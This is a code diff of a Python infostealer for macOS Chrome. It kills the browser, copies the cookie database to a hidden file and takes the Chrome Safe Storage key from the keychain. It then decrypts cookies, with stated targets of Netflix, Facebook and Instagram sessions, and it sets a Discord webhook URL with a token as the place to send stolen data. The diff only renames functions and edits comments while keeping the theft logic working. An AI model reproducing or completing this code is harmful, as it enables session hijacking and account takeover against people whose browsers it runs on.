@@ -10,16 +10,15 @@ from Cryptodome.Cipher import AES
 from Cryptodome.Protocol.KDF import PBKDF2
 
 # --- SURGICAL CONFIGURATION ---
-# Note: Using your provided Webhook URL
 DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1494109026298888273/Ynr2dafzmUxTWd2F0kJSBKeDh87L2XCmFpp48Kbc2YMx6aGNJzEqAr7MEd8CqCv0wjyy"
 NETFLIX_COOKIE_VAL = "243e003a-793a-4cd6-a736-ba7f059401a5"
 
-# Standard Paths for MacBook Pro M1
+# M1 macOS Standard Paths
 CHROME_PATH = os.path.expanduser("~/Library/Application Support/Google/Chrome/Default/Cookies")
 TEMP_DB = os.path.expanduser("~/Desktop/.audit_cache.db")
 
 def kill_chrome():
-    """Closes Chrome properly to release the database lock."""
+    """Forces Chrome to close to release the SQLite write-lock."""
     print("[*] Locking out Google Chrome processes...")
     subprocess.run(["pkill", "-9", "Google Chrome"], capture_output=True)
     time.sleep(2)
@@ -30,7 +29,7 @@ def get_encryption_key():
     password = keyring.get_password("Chrome Safe Storage", "Chrome")
     if not password:
         return None
-    # Derive key: Salt 'saltysalt', 1003 iterations (Standard Chrome)
+    # Derive key: Salt 'saltysalt', 1003 iterations (Chrome Standard)
     return PBKDF2(password, b'saltysalt', 16, count=1003)
 
 def decrypt_value(enc_value, key):
@@ -40,15 +39,16 @@ def decrypt_value(enc_value, key):
         cipher = AES.new(key, AES.MODE_CBC, iv)
         decrypted = cipher.decrypt(enc_value[3:])
         # Clean up PKCS7 padding
-        return decrypted[:-decrypted[-1]].decode('utf-8')
+        padding_len = decrypted[-1]
+        return decrypted[:-padding_len].decode('utf-8')
     except Exception:
         return None
 
-def execute_protocol():
+def execute_strike():
     print(f"[*] Command Center Active. Session: {os.getlogin()}")
     
     if not os.path.exists(CHROME_PATH):
-        print(f"[!] Error: Chrome Path invalid or browser not installed.")
+        print("[!] Error: Chrome path not found.")
         return
 
     # 1. Create the Shadow Copy
@@ -65,7 +65,7 @@ def execute_protocol():
     try:
         key = get_encryption_key()
         if not key:
-            print("[!] Error: Keychain access denied. Script terminated.")
+            print("[!] Error: Keychain access denied.")
             return
 
         # 2. Meta Extraction (FB & IG)
